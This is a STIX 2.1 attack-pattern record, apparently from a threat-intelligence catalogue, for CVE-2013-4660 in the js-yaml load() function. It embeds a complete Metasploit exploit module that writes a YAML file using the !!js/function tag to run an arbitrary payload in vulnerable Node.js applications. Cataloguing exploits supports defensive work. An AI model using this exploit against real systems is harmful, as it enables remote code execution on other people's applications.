{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d90c7d8-776e-4b09-817c-31d4689a97a7",
    "created": "2024-08-14T17:05:13.167553Z",
    "modified": "2024-08-14T17:05:13.167557Z",
    "name": "Nodejs js-yaml load() Code Execution",
    "description": " This module can be used to abuse node.js applications that parse user-supplied YAML input using the load() function from the 'js-yaml' package < 2.0.5, which doesn't properly handle the unsafe !!js/function tag, allowing to specify a self-executing function which results on execution of arbitrary javascript code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/nodejs_js_yaml_load_code_exec.rb",
            "external_id": "nodejs_js_yaml_load_code_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4660"
        },
        {
            "source_name": "reference",
            "url": "https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nodejs js-yaml load() Code Execution',\n      'Description'    => %q{\n        This module can be used to abuse node.js applications that parse user-supplied YAML input\n        using the load() function from the 'js-yaml' package < 2.0.5, which doesn't properly handle\n        the unsafe !!js/function tag, allowing to specify a self-executing function which results\n        on execution of arbitrary javascript code.\n      },\n      'Author'         =>\n        [\n          'Neal Poole', # Vulnerability discovery\n          'joev' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2013-4660'],\n          ['OSVDB', '94656'],\n          ['BID', '60867'],\n          ['URL', 'https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/']\n        ],\n      'Platform'       => 'nodejs',\n      'Arch'           => ARCH_NODEJS,\n      'Privileged'     => false,\n      'Targets'        =>\t[['Automatic', {}]],\n      'DisclosureDate' => '2013-06-28',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptString.new('FILENAME', [ true, 'The file name.', 'msf.yml'])\n    ])\n  end\n\n  def exploit\n    p = payload.encoded\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(\"a: !!js/function >\\n  (function(){ #{p} })();\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-28",
    "x_mitre_platforms": [
        "nodejs'"
    ]
}